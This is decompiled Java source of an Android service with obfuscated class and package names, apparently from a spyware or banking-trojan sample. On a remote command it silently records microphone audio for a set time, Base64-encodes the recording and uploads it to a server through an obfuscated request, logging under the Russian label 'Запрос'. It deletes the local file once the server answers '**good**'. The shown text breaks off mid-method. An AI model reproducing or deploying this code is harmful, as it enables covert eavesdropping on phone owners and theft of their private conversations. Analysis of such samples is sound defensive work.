package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.util.Log;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class cpysnikhf extends IntentService {

    /* renamed from: a */
    boolean f532a = false;

    /* renamed from: b */
    C0034b f533b = new C0034b();

    /* renamed from: c */
    String f534c;

    public cpysnikhf() {
        super("cpysnikhf");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo420a(Context context, String str, String str2, int i) {
        MediaRecorder mediaRecorder = new MediaRecorder();
        Log.e("SOUND", "START RECORD SOUND");
        this.f532a = false;
        mediaRecorder.setAudioSource(1);
        mediaRecorder.setOutputFormat(3);
        mediaRecorder.setAudioEncoder(1);
        mediaRecorder.setOutputFile(str);
        final int i2 = i;
        final Context context2 = context;
        final MediaRecorder mediaRecorder2 = mediaRecorder;
        final String str3 = str;
        final String str4 = str2;
        C00861 r0 = new Runnable() {
            /* JADX WARNING: Code restructure failed: missing block: B:14:0x00f3, code lost:
                r1 = move-exception;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:16:?, code lost:
                r10.f540f.f533b.mo233d(r3, "startRecordSound", "stop");
             */
            /* JADX WARNING: Code restructure failed: missing block: B:19:?, code lost:
                r4.stop();
                r4.release();
                r3 = new java.lang.StringBuilder();
                r3.append("");
                r3.append(r5);
                r10.f540f.f533b.mo213a("FILE", r3.toString());
                r1 = r10.f540f.f533b;
                r0 = android.util.Base64.encodeToString(wocwvy.czyxoxmbauu.slsa.C0034b.m234a(new java.io.File(r5)), 0);
                r1 = r10.f540f.f533b;
                r5 = new java.lang.StringBuilder();
                r5.append("p=");
                r6 = r10.f540f.f533b;
                r7 = new java.lang.StringBuilder();
                r7.append(r6);
                r7.append("||:||");
                r7.append(r0);
                r5.append(r6.mo225c(r7.toString()));
                r0 = r1.mo230d(r10.f540f.f533b.mo218b(r3, "13", r5.toString()));
                r3 = new java.lang.StringBuilder();
                r3.append(" - > ");
                r3.append(r0);
                r10.f540f.f533b.mo213a("Запрос", r3.toString());
             */
            /* JADX WARNING: Code restructure failed: missing block: B:20:0x01aa, code lost:
                if (r0.equals("**good**") != false) goto L_0x01ac;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:21:0x01ac, code lost:
                new java.io.File(r5).delete();
             */
            /* JADX WARNING: Code restructure failed: missing block: B:22:0x01b6, code lost:
                r10.f540f.f533b.mo233d(r3, "startRecordSound", "stop");
             */
            /* JADX WARNING: Code restructure failed: missing block: B:23:0x01c3, code lost:
                return;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:24:0x01c4, code lost:
                r0 = e;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:25:0x01c5, code lost:
                r10.f540f.f533b.mo233d(r3, "startRecordSound", "stop");
                r1 = r10.f540f.f533b;
                r2 = "ERROR";
                r3 = new java.lang.StringBuilder();
             */
            /* JADX WARNING: Code restructure failed: missing block: B:26:0x01df, code lost:
                r10.f540f.f533b.mo213a("SOUND", "STOP RECORD SOUND");
             */
            /* JADX WARNING: Code restructure failed: missing block: B:28:?, code lost:
                r4.stop();
                r4.release();
                r4 = new java.lang.StringBuilder();
                r4.append("");
                r4.append(r5);
                r10.f540f.f533b.mo213a("FILE", r4.toString());
                r2 = r10.f540f.f533b;
                r0 = android.util.Base64.encodeToString(wocwvy.czyxoxmbauu.slsa.C0034b.m234a(new java.io.File(r5)), 0);
                r2 = r10.f540f.f533b;
                r6 = new java.lang.StringBuilder();
                r6.append("p=");
                r7 = r10.f540f.f533b;
                r8 = new java.lang.StringBuilder();
                r8.append(r6);
                r8.append("||:||");
                r8.append(r0);
                r6.append(r7.mo225c(r8.toString()));
                r0 = r2.mo230d(r10.f540f.f533b.mo218b(r3, "13", r6.toString()));
                r4 = new java.lang.StringBuilder();
                r4.append(" - > ");
                r4.append(r0);
                r10.f540f.f533b.mo213a("Запрос", r4.toString());
             */
            /* JADX WARNING: Code restructure failed: missing block: B:29:0x0286, code lost:
                if (r0.equals("**good**") != false) goto L_0x0288;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:30:0x0288, code lost:
                new java.io.File(r5).delete();
             */
            /* JADX WARNING: Code restructure failed: missing block: B:31:0x0292, code lost:
                r10.f540f.f533b.mo233d(r3, "startRecordSound", "stop");
             */
            /* JADX WARNING: Code restructure failed: missing block: B:32:0x029f, code lost:
                throw r1;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:33:0x02a0, code lost:
                r0 = e;
             */
            /* JADX WARNING: Code restructure failed: missing block: B:34:0x02a1, code lost:
                r10.f540f.f533b.mo233d(r3, "startRecordSound", "stop");
                r1 = r10.f540f.f533b;
                r2 = "ERROR";
                r3 = new java.lang.StringBuilder();
             */
            /* JADX WARNING: Failed to process nested try/catch */
            /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x00f6 */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /*
                    r10 = this;
                    r0 = 0
                    int r1 = r2     // Catch:{ InterruptedException -> 0x00f6 }
                    int r1 = r1 * 1000
                    long r1 = (long) r1     // Catch:{ InterruptedException -> 0x00f6 }
                    java.lang.Thread.sleep(r1)     // Catch:{ InterruptedException -> 0x00f6 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    java.lang.String r2 = "SOUND"
                    java.lang.String r3 = "STOP RECORD SOUND"
                    r1.mo213a(r2, r3)
                    android.media.MediaRecorder r1 = r4     // Catch:{ Exception -> 0x00ca }
                    r1.stop()     // Catch:{ Exception -> 0x00ca }
                    android.media.MediaRecorder r1 = r4     // Catch:{ Exception -> 0x00ca }
                    r1.release()     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r2 = "FILE"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00ca }
                    r3.<init>()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r4 = ""
                    r3.append(r4)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r4 = r5     // Catch:{ Exception -> 0x00ca }
                    r3.append(r4)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x00ca }
                    r1.mo213a(r2, r3)     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x00ca }
                    java.io.File r1 = new java.io.File     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r2 = r5     // Catch:{ Exception -> 0x00ca }
                    r1.<init>(r2)     // Catch:{ Exception -> 0x00ca }
                    byte[] r1 = wocwvy.czyxoxmbauu.slsa.C0034b.m234a(r1)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = android.util.Base64.encodeToString(r1, r0)     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x00ca }
                    android.content.Context r3 = r3     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r4 = "13"
                    java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00ca }
                    r5.<init>()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r6 = "p="
                    r5.append(r6)     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r6 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f533b     // Catch:{ Exception -> 0x00ca }
                    java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00ca }
                    r7.<init>()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r8 = r6     // Catch:{ Exception -> 0x00ca }
                    r7.append(r8)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r8 = "||:||"
                    r7.append(r8)     // Catch:{ Exception -> 0x00ca }
                    r7.append(r0)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = r7.toString()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = r6.mo225c(r0)     // Catch:{ Exception -> 0x00ca }
                    r5.append(r0)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = r5.toString()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = r2.mo218b(r3, r4, r0)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r0 = r1.mo230d(r0)     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r2 = "Запрос"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x00ca }
                    r3.<init>()     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r4 = " - > "
                    r3.append(r4)     // Catch:{ Exception -> 0x00ca }
                    r3.append(r0)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x00ca }
                    r1.mo213a(r2, r3)     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r1 = "**good**"
                    boolean r0 = r0.equals(r1)     // Catch:{ Exception -> 0x00ca }
                    if (r0 == 0) goto L_0x00bc
                    java.io.File r0 = new java.io.File     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r1 = r5     // Catch:{ Exception -> 0x00ca }
                    r0.<init>(r1)     // Catch:{ Exception -> 0x00ca }
                    r0.delete()     // Catch:{ Exception -> 0x00ca }
                L_0x00bc:
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r0 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x00ca }
                    wocwvy.czyxoxmbauu.slsa.b r0 = r0.f533b     // Catch:{ Exception -> 0x00ca }
                    android.content.Context r1 = r3     // Catch:{ Exception -> 0x00ca }
                    java.lang.String r2 = "startRecordSound"
                    java.lang.String r3 = "stop"
                    r0.mo233d(r1, r2, r3)     // Catch:{ Exception -> 0x00ca }
                    return
                L_0x00ca:
                    r0 = move-exception
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    android.content.Context r2 = r3
                    java.lang.String r3 = "startRecordSound"
                    java.lang.String r4 = "stop"
                    r1.mo233d(r2, r3, r4)
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    java.lang.String r2 = "ERROR"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder
                    r3.<init>()
                L_0x00e3:
                    java.lang.String r4 = "Record Sound! "
                    r3.append(r4)
                    r3.append(r0)
                    java.lang.String r0 = r3.toString()
                    r1.mo213a(r2, r0)
                    return
                L_0x00f3:
                    r1 = move-exception
                    goto L_0x01df
                L_0x00f6:
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ all -> 0x00f3 }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ all -> 0x00f3 }
                    android.content.Context r2 = r3     // Catch:{ all -> 0x00f3 }
                    java.lang.String r3 = "startRecordSound"
                    java.lang.String r4 = "stop"
                    r1.mo233d(r2, r3, r4)     // Catch:{ all -> 0x00f3 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    java.lang.String r2 = "SOUND"
                    java.lang.String r3 = "STOP RECORD SOUND"
                    r1.mo213a(r2, r3)
                    android.media.MediaRecorder r1 = r4     // Catch:{ Exception -> 0x01c4 }
                    r1.stop()     // Catch:{ Exception -> 0x01c4 }
                    android.media.MediaRecorder r1 = r4     // Catch:{ Exception -> 0x01c4 }
                    r1.release()     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r2 = "FILE"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01c4 }
                    r3.<init>()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r4 = ""
                    r3.append(r4)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r4 = r5     // Catch:{ Exception -> 0x01c4 }
                    r3.append(r4)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x01c4 }
                    r1.mo213a(r2, r3)     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x01c4 }
                    java.io.File r1 = new java.io.File     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r2 = r5     // Catch:{ Exception -> 0x01c4 }
                    r1.<init>(r2)     // Catch:{ Exception -> 0x01c4 }
                    byte[] r1 = wocwvy.czyxoxmbauu.slsa.C0034b.m234a(r1)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = android.util.Base64.encodeToString(r1, r0)     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x01c4 }
                    android.content.Context r3 = r3     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r4 = "13"
                    java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01c4 }
                    r5.<init>()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r6 = "p="
                    r5.append(r6)     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r6 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f533b     // Catch:{ Exception -> 0x01c4 }
                    java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01c4 }
                    r7.<init>()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r8 = r6     // Catch:{ Exception -> 0x01c4 }
                    r7.append(r8)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r8 = "||:||"
                    r7.append(r8)     // Catch:{ Exception -> 0x01c4 }
                    r7.append(r0)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = r7.toString()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = r6.mo225c(r0)     // Catch:{ Exception -> 0x01c4 }
                    r5.append(r0)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = r5.toString()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = r2.mo218b(r3, r4, r0)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r0 = r1.mo230d(r0)     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r2 = "Запрос"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01c4 }
                    r3.<init>()     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r4 = " - > "
                    r3.append(r4)     // Catch:{ Exception -> 0x01c4 }
                    r3.append(r0)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r3 = r3.toString()     // Catch:{ Exception -> 0x01c4 }
                    r1.mo213a(r2, r3)     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r1 = "**good**"
                    boolean r0 = r0.equals(r1)     // Catch:{ Exception -> 0x01c4 }
                    if (r0 == 0) goto L_0x01b6
                    java.io.File r0 = new java.io.File     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r1 = r5     // Catch:{ Exception -> 0x01c4 }
                    r0.<init>(r1)     // Catch:{ Exception -> 0x01c4 }
                    r0.delete()     // Catch:{ Exception -> 0x01c4 }
                L_0x01b6:
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r0 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x01c4 }
                    wocwvy.czyxoxmbauu.slsa.b r0 = r0.f533b     // Catch:{ Exception -> 0x01c4 }
                    android.content.Context r1 = r3     // Catch:{ Exception -> 0x01c4 }
                    java.lang.String r2 = "startRecordSound"
                    java.lang.String r3 = "stop"
                    r0.mo233d(r1, r2, r3)     // Catch:{ Exception -> 0x01c4 }
                    return
                L_0x01c4:
                    r0 = move-exception
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    android.content.Context r2 = r3
                    java.lang.String r3 = "startRecordSound"
                    java.lang.String r4 = "stop"
                    r1.mo233d(r2, r3, r4)
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    java.lang.String r2 = "ERROR"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder
                    r3.<init>()
                    goto L_0x00e3
                L_0x01df:
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b
                    java.lang.String r3 = "SOUND"
                    java.lang.String r4 = "STOP RECORD SOUND"
                    r2.mo213a(r3, r4)
                    android.media.MediaRecorder r2 = r4     // Catch:{ Exception -> 0x02a0 }
                    r2.stop()     // Catch:{ Exception -> 0x02a0 }
                    android.media.MediaRecorder r2 = r4     // Catch:{ Exception -> 0x02a0 }
                    r2.release()     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r3 = "FILE"
                    java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x02a0 }
                    r4.<init>()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r5 = ""
                    r4.append(r5)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r5 = r5     // Catch:{ Exception -> 0x02a0 }
                    r4.append(r5)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r4 = r4.toString()     // Catch:{ Exception -> 0x02a0 }
                    r2.mo213a(r3, r4)     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x02a0 }
                    java.io.File r2 = new java.io.File     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r3 = r5     // Catch:{ Exception -> 0x02a0 }
                    r2.<init>(r3)     // Catch:{ Exception -> 0x02a0 }
                    byte[] r2 = wocwvy.czyxoxmbauu.slsa.C0034b.m234a(r2)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = android.util.Base64.encodeToString(r2, r0)     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r3 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f533b     // Catch:{ Exception -> 0x02a0 }
                    android.content.Context r4 = r3     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r5 = "13"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x02a0 }
                    r6.<init>()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r7 = "p="
                    r6.append(r7)     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r7 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r7 = r7.f533b     // Catch:{ Exception -> 0x02a0 }
                    java.lang.StringBuilder r8 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x02a0 }
                    r8.<init>()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r9 = r6     // Catch:{ Exception -> 0x02a0 }
                    r8.append(r9)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r9 = "||:||"
                    r8.append(r9)     // Catch:{ Exception -> 0x02a0 }
                    r8.append(r0)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = r8.toString()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = r7.mo225c(r0)     // Catch:{ Exception -> 0x02a0 }
                    r6.append(r0)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = r6.toString()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = r3.mo218b(r4, r5, r0)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r0 = r2.mo230d(r0)     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r2 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f533b     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r3 = "Запрос"
                    java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x02a0 }
                    r4.<init>()     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r5 = " - > "
                    r4.append(r5)     // Catch:{ Exception -> 0x02a0 }
                    r4.append(r0)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r4 = r4.toString()     // Catch:{ Exception -> 0x02a0 }
                    r2.mo213a(r3, r4)     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r2 = "**good**"
                    boolean r0 = r0.equals(r2)     // Catch:{ Exception -> 0x02a0 }
                    if (r0 == 0) goto L_0x0292
                    java.io.File r0 = new java.io.File     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r2 = r5     // Catch:{ Exception -> 0x02a0 }
                    r0.<init>(r2)     // Catch:{ Exception -> 0x02a0 }
                    r0.delete()     // Catch:{ Exception -> 0x02a0 }
                L_0x0292:
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r0 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this     // Catch:{ Exception -> 0x02a0 }
                    wocwvy.czyxoxmbauu.slsa.b r0 = r0.f533b     // Catch:{ Exception -> 0x02a0 }
                    android.content.Context r2 = r3     // Catch:{ Exception -> 0x02a0 }
                    java.lang.String r3 = "startRecordSound"
                    java.lang.String r4 = "stop"
                    r0.mo233d(r2, r3, r4)     // Catch:{ Exception -> 0x02a0 }
                    throw r1
                L_0x02a0:
                    r0 = move-exception
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    android.content.Context r2 = r3
                    java.lang.String r3 = "startRecordSound"
                    java.lang.String r4 = "stop"
                    r1.mo233d(r2, r3, r4)
                    wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.this
                    wocwvy.czyxoxmbauu.slsa.b r1 = r1.f533b
                    java.lang.String r2 = "ERROR"
                    java.lang.StringBuilder r3 = new java.lang.StringBuilder
                    r3.<init>()
                    goto L_0x00e3
                */
                throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.C00861.run():void");
            }
        };
        Thread thread = new Thread(r0);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
        } catch (IOException unused) {
        }
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        this.f533b.mo233d(this, "startRecordSound", "start");
        try {
            int parseInt = Integer.parseInt(intent.getStringExtra("time"));
            if (parseInt > 0) {
                String format = new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US).format(Calendar.getInstance().getTime());
                StringBuilder sb = new StringBuilder();
                sb.append("/RecordSound_");
                sb.append(format);
                sb.append(".amr");
                String sb2 = sb.toString();
                StringBuilder sb3 = new StringBuilder();
                sb3.append(getExternalFilesDir(null));
                sb3.append(sb2);
                this.f534c = sb3.toString();
                StringBuilder sb4 = new StringBuilder();
                sb4.append("");
                sb4.append(this.f534c);
                this.f533b.mo213a("FILE REC", sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("");
                sb5.append(parseInt);
                this.f533b.mo213a("Time", sb5.toString());
                mo420a(this, this.f534c, sb2, parseInt);
            }
